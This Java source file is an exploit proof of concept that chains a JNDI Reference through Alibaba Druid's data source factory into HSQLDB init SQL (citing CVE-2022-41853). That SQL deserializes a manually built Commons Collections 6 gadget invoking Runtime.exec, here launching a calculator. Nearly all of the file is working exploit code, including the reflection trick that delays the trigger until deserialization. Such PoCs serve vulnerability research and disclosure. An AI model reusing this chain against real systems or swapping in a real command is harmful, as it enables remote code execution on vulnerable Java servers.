import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

/**
 * PoC: JNDIReferencePayload  →  DruidJdbcAttack  →  HsqldbHexDeserJdbc
 * Triggers calc.exe (Windows) or gnome-calculator (Linux) locally.
 *
 * Run with:  java -cp "all-the-jars/*" poc.DruidHsqldbChain
 *
 * IMPORTANT:  -Dhsqldb.method_class_names=*   must be left unset
 *             (the default setting allows every class – exactly what
 *             CVE-2022-41853 relies on).
 */
public class DruidHsqldbChain {

    public static void main(String[] args) throws Exception {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");

        /* =========  Stage 0 – build a gadget, here CC6 manually implemented ========== */
        byte[] gadget = generateCC6("calc");          // or "gnome-calculator" on Linux
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(gadget));
//        ois.readObject();
        String hex    = bytesToHex(gadget);           // turn it into X'....' literal

        /* =================  Stage 1 – craft the HSQL init SQL  ================ */
        String sql = "CALL \"org.springframework.util.SerializationUtils.deserialize\"(X'" + hex + "');";

        /* =========  Stage 2 – assemble the malicious JDBC URL  ================ */

        /* ===========  Stage 3 – put everything into a Reference  ============== */
        Reference ref = new Reference(
                "javax.sql.DataSource",
                "com.alibaba.druid.pool.DruidDataSourceFactory",   // factory
                null);

        ref.add(new StringRefAddr("driverClassName", "org.hsqldb.jdbcDriver"));
        ref.add(new StringRefAddr("url",             "jdbc:hsqldb:mem:exploitdb;"));
        ref.add(new StringRefAddr("initConnectionSqls",    sql));
//        ref.add(new StringRefAddr("validationQuery",    sql));
        ref.add(new StringRefAddr("init",        "true"));
        ref.add(new StringRefAddr("initialSize", "1"));

        /* ==== Stage 4 – emulate the JNDI lookup (triggers the whole chain) ==== */
        new com.alibaba.druid.pool.DruidDataSourceFactory()
                .getObjectInstance(ref, null, null, null);

        System.out.println("[+] done.");
    }

    /* ---------------------------------------------------------------------- */
    /* helper methods                                                         */
    /* ---------------------------------------------------------------------- */

    /** manually implement CommonsCollections6 payload to avoid early trigger */
    private static byte[] generateCC6(String cmd) throws Exception {
        // CC6 chain: HashMap.readObject() -> TiedMapEntry.hashCode() -> TiedMapEntry.getValue() -> LazyMap.get() -> ChainedTransformer.transform()

        // Create a fake transformer chain that does nothing (for serialization)
        Transformer[] fakeTransformers = new Transformer[] {
            new ConstantTransformer("dummy")
        };
        Transformer fakeTransformerChain = new ChainedTransformer(fakeTransformers);

        // Create LazyMap with fake transformer chain
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, fakeTransformerChain);

        // Create TiedMapEntry with LazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");

        // Create HashMap and put TiedMapEntry as key
        Map outerMap = new HashMap();
        outerMap.put(tiedMapEntry, "value");

        // Remove the key from LazyMap to avoid triggering during put()
        lazyMap.remove("key");

        // Now use reflection to replace the fake transformer with the real malicious one
        // Create the real transformer chain for command execution
        Transformer[] realTransformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { cmd })
        };
        Transformer realTransformerChain = new ChainedTransformer(realTransformers);

        // Use reflection to replace the fake transformer in LazyMap
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, realTransformerChain);

        // Serialize the HashMap
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(bos)) {
            oos.writeObject(outerMap);
            return bos.toByteArray();
        }
    }

    private static String bytesToHex(byte[] data) {
        StringBuilder sb = new StringBuilder(data.length * 2);
        for (byte b : data) sb.append(String.format("%02X", b));
        return sb.toString();
    }

    private static String urlEncode(String s) throws Exception {
        return java.net.URLEncoder.encode(s, "UTF-8").replace("+", "%20");
    }
}
